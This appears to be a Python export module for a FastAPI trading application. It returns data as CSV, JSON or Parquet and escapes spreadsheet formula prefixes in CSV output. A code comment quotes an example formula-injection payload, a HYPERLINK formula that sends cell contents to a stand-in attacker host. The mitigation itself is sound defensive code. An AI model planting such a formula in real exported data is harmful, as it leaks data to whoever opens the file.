"""Render a list of flat dicts as CSV, JSON, or Parquet. Parquet specifically because
that's the format OneLake (Microsoft Fabric's lake, and the thing a Fabric pipeline
would ultimately land this data into) speaks natively -- a Fabric "Copy Data" activity
pointed at these endpoints can write straight to a Lakehouse Delta table."""

import io
from typing import Any, Literal

import pandas as pd
from fastapi import Response

ExportFormat = Literal["csv", "json", "parquet"]

_MEDIA_TYPES: dict[ExportFormat, str] = {
    "csv": "text/csv",
    "json": "application/json",
    "parquet": "application/octet-stream",
}

# Excel/Sheets treats a cell starting with any of these as the start of a formula
# when a CSV is opened -- a free-text field a TRADER controls end to end (e.g.
# Counterparty.name, Book.name; see CounterpartyCreate/BookCreate, which have no
# length or pattern constraint) could smuggle a formula (e.g.
# `=HYPERLINK("http://attacker.example/steal?x="&A1)`) that executes when an
# ADMIN/RISK_MANAGER later opens an exported CSV in a spreadsheet app -- classic
# CSV/formula injection. Only relevant to the CSV branch below: JSON/Parquet
# consumers don't interpret cell content as formulas.
_CSV_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def _neutralize_csv_formula_injection(value: Any) -> Any:
    """Prefixing with a single quote is the standard mitigation -- spreadsheet apps
    render a leading `'` as "the rest of this cell is literal text", not part of
    the value, so the formula never executes."""
    if isinstance(value, str) and value.startswith(_CSV_FORMULA_PREFIXES):
        return "'" + value
    return value


def rows_to_response(
    rows: list[dict[str, Any]], export_format: ExportFormat, filename_stem: str
) -> Response:
    df = pd.DataFrame(rows)

    if export_format == "csv":
        buf = io.StringIO()
        df.map(_neutralize_csv_formula_injection).to_csv(buf, index=False)
        content: str | bytes = buf.getvalue()
    elif export_format == "parquet":
        parquet_buf = io.BytesIO()
        df.to_parquet(parquet_buf, index=False)
        content = parquet_buf.getvalue()
    else:
        content = df.to_json(orient="records", date_format="iso")

    return Response(
        content=content,
        media_type=_MEDIA_TYPES[export_format],
        headers={"Content-Disposition": f'attachment; filename="{filename_stem}.{export_format}"'},
    )
